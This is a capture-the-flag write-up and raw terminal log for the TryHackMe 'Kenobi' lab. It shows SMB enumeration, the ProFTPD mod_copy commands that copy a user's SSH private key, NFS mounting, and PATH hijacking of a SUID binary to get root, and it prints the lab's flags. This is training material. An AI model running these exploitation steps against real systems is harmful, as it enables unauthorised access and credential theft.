# Kenobi — TryHackMe Writeup

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Linux, SMB, FTP, NFS, Privilege Escalation  
> **Status:** Completed ✅

---

## Flags

| Flag | Hash |
|------|------|
| User | `d0b0f3f53b6caa532a83915e19224899` |
| Root | `177b3cd8562289f37382721c28381f02` |

---

## Attack Path

```
Nmap Scan
    └── SMB Enumeration → log.txt → SSH key location discovered
    └── FTP (ProFTPD 1.3.5) → mod_copy exploit → copied id_rsa to /var/tmp
    └── NFS Mount (/var) → retrieved id_rsa locally
            └── SSH as kenobi → User Flag
                    └── SUID Binary (/usr/bin/menu) → PATH Hijacking → Root Shell → Root Flag
```

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -Pn 10.49.131.160
```

```
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
111/tcp  open   rpcbind
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
2049/tcp open   nfs
```

> `-Pn` skips the ping/host discovery phase and treats the target as alive. Useful when ICMP is blocked by a firewall.

**Notable services:**

| Port | Service | Relevance |
|------|---------|-----------|
| 21 | FTP | Check version for known exploits |
| 111 | rpcbind | Reveals RPC services — especially NFS |
| 445 | SMB | Check for anonymous access and sensitive files |
| 2049 | NFS | Can mount remote directories locally if misconfigured |

---

## 2. Enumeration

### 2.1 SMB — Listing Shares

SMB (Server Message Block) is a protocol that allows file and resource sharing over a network. The first step is listing what shares are available.

```bash
smbclient -L //10.49.131.160 -N
```

> `-L` lists all shares on the target  
> `-N` performs a null session — connects without any credentials

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk
IPC$            IPC       IPC Service (kenobi server)
```

The `anonymous` share has no restrictions — accessible without credentials.

---

### 2.2 SMB — Accessing Anonymous Share

```bash
smbclient //10.49.131.160/anonymous
# Press Enter when prompted for password
```

```
smb: \> ls
  log.txt    N    12237    Wed Sep 4 11:49:09 2019
```

Download the file:

```bash
smb: \> get log.txt
```

---

### 2.3 Analyzing log.txt

```bash
cat log.txt
```

**Key finding inside the file:**

```
Generating public/private rsa key pair.
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
```

> **Critical:** The log reveals that an SSH RSA key pair was generated for the user `kenobi` and stored at `/home/kenobi/.ssh/id_rsa`. If we can retrieve this private key, we can authenticate via SSH without any password.

---

### 2.4 NFS Enumeration via rpcbind

**What is rpcbind?**

`rpcbind` runs on port 111 and acts as a directory service for RPC (Remote Procedure Call) services. When any RPC service starts, it registers with rpcbind. Clients query port 111 to find out which port a specific service is listening on.

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.49.131.160
```

```
| nfs-showmount:
|_  /var *
```

> The `/var` directory is exported via NFS with `*` meaning it is accessible by **anyone** on the network. This is a severe misconfiguration.

**What is NFS?**

NFS (Network File System) allows remote directories to be mounted and accessed locally as if they were on your own machine. If a directory is exported without restrictions, an attacker can mount it and browse all its contents freely.

---

### 2.5 FTP — Banner Grabbing

Connect to FTP using netcat to identify the exact version:

```bash
nc 10.49.131.160 21
```

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
```

---

## 3. Exploitation

### 3.1 ProFTPD 1.3.5 — mod_copy Vulnerability

Search for known exploits:

```bash
searchsploit proftpd 1.3.5
```

```
ProFTPd 1.3.5 - 'mod_copy' Command Execution
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution
ProFTPd 1.3.5 - File Copy
```

**What is the mod_copy vulnerability?**

ProFTPD 1.3.5 ships with a module called `mod_copy` that implements two FTP commands:

- `SITE CPFR` — Copy From (specify source file)
- `SITE CPTO` — Copy To (specify destination file)

The critical flaw is that these commands work **without any authentication**. Anyone who connects to port 21 can copy any file on the server to any other location — including locations accessible via NFS.

**Plan:**

```
id_rsa lives at  →  /home/kenobi/.ssh/id_rsa   (not directly accessible)
/var is exported →  accessible via NFS
Therefore        →  copy id_rsa into /var/tmp/  →  retrieve it via NFS
```

---

### 3.2 Executing mod_copy

```bash
nc 10.49.131.160 21
```

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

The private key has been copied to `/var/tmp/id_rsa` — inside the NFS-exported `/var` directory.

---

### 3.3 Mounting NFS and Retrieving the Key

Mount the remote `/var` directory locally:

```bash
mkdir /mnt/kenobiNFS
mount 10.49.131.160:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

The remote filesystem is now accessible locally. Copy the private key:

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
```

Set correct permissions — SSH refuses to use a private key that is readable by others:

```bash
chmod 600 id_rsa
```

> `600` = only the owner can read and write. This is mandatory for SSH private key files.

---

### 3.4 SSH Login as Kenobi

```bash
ssh -i id_rsa kenobi@10.49.131.160
```

> `-i id_rsa` tells SSH to authenticate using the private key instead of a password.

```
Welcome to Ubuntu 20.04.6 LTS...
kenobi@kenobi:~$
```

```bash
cat user.txt
```

```
d0b0f3f53b6caa532a83915e19224899
```

**User flag captured.** ✅

---

## 4. Privilege Escalation

### 4.1 Finding SUID Binaries

SUID (Set User ID) is a special Linux file permission. When set on a binary owned by root, it executes as root regardless of which user runs it. Misconfigured SUID binaries are a common privilege escalation vector.

```bash
find / -perm -u=s -type f 2>/dev/null
```

> `-perm -u=s` finds files with the SUID bit set  
> `-type f` only regular files  
> `2>/dev/null` suppresses permission denied errors

**Interesting result:**

```
/usr/bin/menu
```

`/usr/bin/menu` is a non-standard custom binary with the SUID bit set and owned by root. This is immediately suspicious.

---

### 4.2 Analyzing the Binary

```bash
strings /usr/bin/menu
```

> `strings` prints all readable text embedded inside a binary. It reveals what commands the binary calls internally.

**Output includes:**

```
curl -I localhost
uname -r
ifconfig
```

Running the binary confirms:

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

**The vulnerability:** The binary calls `curl`, `uname`, and `ifconfig` using **relative paths** not absolute paths like `/usr/bin/curl`. This means Linux will search the `PATH` environment variable directories in order to find which binary to execute — and we can control that search order.

---

### 4.3 PATH Hijacking Attack

**How Linux resolves commands:**

When you run any command, Linux searches directories listed in `PATH` from left to right and executes the first match it finds.

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Real `curl` lives at `/usr/bin/curl` and gets found normally. We can hijack this.

**The attack — step by step:**

```bash
# Step 1 — Navigate to /tmp
cd /tmp

# Step 2 — Create a fake file named curl that spawns a shell
echo /bin/sh > curl

# Step 3 — Make it executable
chmod 777 curl

# Step 4 — Prepend /tmp to PATH so it is searched before /usr/bin
export PATH=/tmp:$PATH
```

**Why `echo /bin/sh > curl` works:**

When Linux executes a script file, it reads the first line and runs it. Our fake `curl` contains just `/bin/sh` — so when executed, it opens a shell. Since `/usr/bin/menu` is SUID root, that shell inherits root privileges.

**PATH resolution before vs after:**

```
Before:  ... → /usr/bin → finds real curl → executes real curl
After:   /tmp → finds fake curl first → executes /bin/sh → root shell
```

---

### 4.4 Triggering the Exploit

```bash
/usr/bin/menu
```

```
** Enter your choice :1
#
```

The `#` prompt indicates a root shell.

---

### 4.5 Confirming Root Access

```bash
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi)...

# whoami
root
```

---

### 4.6 Root Flag

```bash
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```

**Root flag captured.** ✅

---

## 5. Summary

| # | Step | Technique |
|---|------|-----------|
| 1 | Port scan | `nmap -Pn` |
| 2 | SMB null session | `smbclient -N` |
| 3 | Found SSH key location | `log.txt` analysis |
| 4 | Copied SSH key | ProFTPD mod_copy (unauthenticated file copy) |
| 5 | Retrieved key | NFS misconfiguration — mounted `/var` locally |
| 6 | SSH login as kenobi | Private key authentication |
| 7 | Found SUID binary | `find -perm -u=s` |
| 8 | Root shell | PATH hijacking via fake `curl` binary |

---

## 6. Key Concepts

**SMB Null Session** — Connecting to an SMB share without any credentials. Possible when the server allows anonymous access due to misconfiguration.

**rpcbind (Port 111)** — Acts as a phonebook for RPC services. Querying it reveals what services like NFS are running and on which ports.

**NFS Misconfiguration** — Exporting a directory with `*` makes it accessible to any host. An attacker can mount it and read all its contents without authentication.

**ProFTPD mod_copy** — A vulnerability in ProFTPD 1.3.5 that allows unauthenticated file copy anywhere on the server using `SITE CPFR` and `SITE CPTO` commands.

**SUID Binary** — A binary that runs as its owner (root) regardless of who executes it. Dangerous when it calls system commands with relative paths.

**PATH Hijacking** — Placing a malicious binary early in the `PATH` variable so it is found and executed before the legitimate system binary.

---

## 7. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and script-based enumeration |
| `smbclient` | SMB share listing and file access |
| `netcat (nc)` | Banner grabbing and raw FTP interaction |
| `searchsploit` | Searching local ExploitDB for known vulnerabilities |
| `mount` | Mounting NFS shares locally |
| `ssh` | Remote login using private key |
| `find` | Locating SUID binaries on the filesystem |
| `strings` | Extracting readable text from compiled binaries |

---

*Writeup by — B.Tech CSE (6th Sem) | TryHackMe Jr Pentester Path*







# Port Scan
root@ip-10-49-65-11:~# nmap -Pn 10.49.131.160
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-13 06:59 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.49.131.160
Host is up (0.0069s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

# Enumerated smb for shares 
root@ip-10-49-65-11:~# smbclient -L //10.49.131.160 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
root@ip-10-49-65-11:~# 
#
root@ip-10-49-65-11:~# smbclient //10.49.131.160/anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Sat Aug  9 14:03:22 2025
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

		9183416 blocks of size 1024. 2991648 blocks available
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> ls
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Sat Aug  9 14:03:22 2025
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

		9183416 blocks of size 1024. 2991648 blocks available
smb: \> cat log.txt
cat: command not found
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (3983.3 KiloBytes/sec) (average 3983.4 KiloBytes/sec)
smb: \> pwd
Current directory is \\10.49.131.160\anonymous\
smb: \> ls
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Sat Aug  9 14:03:22 2025
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

		9183416 blocks of size 1024. 2991648 blocks available
smb: \> cd ..
smb: \> ls
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Sat Aug  9 14:03:22 2025
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

		9183416 blocks of size 1024. 2991648 blocks available
smb: \> pwd
Current directory is \\10.49.131.160\anonymous\
smb: \> whoami
whoami: command not found
smb: \> 
#
root@ip-10-49-65-11:~# cat log.txt
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi


#
root@ip-10-49-65-11:~# nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.49.131.160
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-13 07:25 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.49.131.160
Host is up (0.00068s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| ??????????  ?    ?    ?     ?                    ..
| rwxr-xr-x   0    0    4096  2026-05-13T05:59:00  backups
| rwxr-xr-x   0    0    4096  2025-08-10T06:48:58  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2026-05-13T05:52:18  log
| rwxr-xr-x   0    0    4096  2025-08-09T13:38:21  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9183416.0  5701180.0  2991640.0  66%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds


# NetCad Listener
root@ip-10-49-65-11:~# nc 10.49.131.160
nc: missing port number
root@ip-10-49-65-11:~# nc 10.49.131.160 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.49.131.160]


#
root@ip-10-49-65-11:~# searchsploit proftpd 1.3.5
---------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                            |  Path
---------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                 | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                       | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                   | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                 | linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

# 
root@ip-10-49-65-11:~# nc 10.49.131.160 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.49.131.160]
SITE CPFR 421 Login timeout (300 seconds): closing control connection
SITE CPFR /home/kenobi/.ssh/id_rsa
root@ip-10-49-65-11:~# nc 10.49.131.160 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.49.131.160]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
421 Login timeout (300 seconds): closing control connection

#
root@ip-10-49-65-11:~# sudo mkdir /mnt/kenobiNFS
sudo: unable to resolve host ip-10-49-65-11: Name or service not known
root@ip-10-49-65-11:~# ls
burp.json  CTFBuilder  Desktop  Downloads  Instructions  log.txt  Pictures  Postman  Rooms  Scripts  snap  thinclient_drives  Tools
root@ip-10-49-65-11:~# mkdir /mnt/kenobiNFS
mkdir: cannot create directory \u2018/mnt/kenobiNFS\u2019: File exists
root@ip-10-49-65-11:~# mount 10.49.131.160:/var /mnt/kenobiNFS
root@ip-10-49-65-11:~# 
root@ip-10-49-65-11:~# ls -la /mnt/kenobiNFS
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 May 13 07:41 ..
drwxr-xr-x  2 root root  4096 May 13 06:59 backups
drwxr-xr-x 15 root root  4096 Aug 10  2025 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 51 root root  4096 Aug 10  2025 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 13 root lxd   4096 May 13 06:52 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  5 root root  4096 Aug  9  2025 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  8 root root  4096 May 13 07:26 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
root@ip-10-49-65-11:~# cp /mnt/kenobiNFS/tmp/id_rsa
cp: missing destination file operand after '/mnt/kenobiNFS/tmp/id_rsa'
Try 'cp --help' for more information.
root@ip-10-49-65-11:~# cp /mnt/kenobiNFS/tmp/id_rsa .
root@ip-10-49-65-11:~# sudo chmod 600 id_rsa
sudo: unable to resolve host ip-10-49-65-11: Name or service not known
root@ip-10-49-65-11:~# chmod 600 id_rsa
root@ip-10-49-65-11:~# ssh -i id_rsa kenobi@10.49.131.160
The authenticity of host '10.49.131.160 (10.49.131.160)' can't be established.
ECDSA key fingerprint is SHA256:0h8eEdFM875tV3fqN5v4epOkYnTPtO1Hv0mqV4AFaWY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.131.160' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 13 May 2026 01:44:57 AM CDT

  System load:  0.08              Processes:             122
  Usage of /:   62.2% of 8.76GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for eth0: 10.49.131.160
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

40 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sat Aug  9 07:57:51 2025 from 10.23.8.228
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$ 
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$ cd share
kenobi@kenobi:~/share$ ls
log.txt
kenobi@kenobi:~/share$ cd ..
kenobi@kenobi:~$ pwd
/home/kenobi
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/su
vkenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cd tmp
-bash: cd: tmp: No such file or directory
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ ls
snap-private-tmp
systemd-private-08979ad98b6a482bba0761d5575eae97-apache2.service-59I60f
systemd-private-08979ad98b6a482bba0761d5575eae97-ModemManager.service-zA1nGh
systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-logind.service-FHcM3f
systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-resolved.service-OGMHCg
systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-timesyncd.service-qvug1e
kenobi@kenobi:/tmp$ pwd
/tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# ls
curl
snap-private-tmp
systemd-private-08979ad98b6a482bba0761d5575eae97-apache2.service-59I60f
systemd-private-08979ad98b6a482bba0761d5575eae97-ModemManager.service-zA1nGh
systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-logind.service-FHcM3f
systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-resolved.service-OGMHCg
systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-timesyncd.service-qvug1e
# ls -la
total 56
drwxrwxrwt 13 root   root   4096 May 15 01:14 .
drwxr-xr-x 23 root   root   4096 May 15 00:36 ..
-rwxrwxrwx  1 kenobi kenobi    8 May 15 01:14 curl
drwxrwxrwt  2 root   root   4096 May 15 00:36 .font-unix
drwxrwxrwt  2 root   root   4096 May 15 00:36 .ICE-unix
drwx------  3 root   root   4096 May 15 00:37 snap-private-tmp
drwx------  3 root   root   4096 May 15 00:36 systemd-private-08979ad98b6a482bba0761d5575eae97-apache2.service-59I60f
drwx------  3 root   root   4096 May 15 00:36 systemd-private-08979ad98b6a482bba0761d5575eae97-ModemManager.service-zA1nGh
drwx------  3 root   root   4096 May 15 00:36 systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-logind.service-FHcM3f
drwx------  3 root   root   4096 May 15 00:36 systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-resolved.service-OGMHCg
drwx------  3 root   root   4096 May 15 00:36 systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-timesyncd.service-qvug1e
drwxrwxrwt  2 root   root   4096 May 15 00:36 .Test-unix
drwxrwxrwt  2 root   root   4096 May 15 00:36 .X11-unix
drwxrwxrwt  2 root   root   4096 May 15 00:36 .XIM-unix
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# ls
curl
snap-private-tmp
systemd-private-08979ad98b6a482bba0761d5575eae97-apache2.service-59I60f
systemd-private-08979ad98b6a482bba0761d5575eae97-ModemManager.service-zA1nGh
systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-logind.service-FHcM3f
systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-resolved.service-OGMHCg
systemd-private-08979ad98b6a482bba0761d5575eae97-systemd-timesyncd.service-qvug1e
# cat curl
/bin/sh
# pwd
/tmp
# cd ..
# pwd
/
# whoami
root
# cd root
# ls
root.txt  snap
# cat root.txt
177b3cd8562289f37382721c28381f02
# 



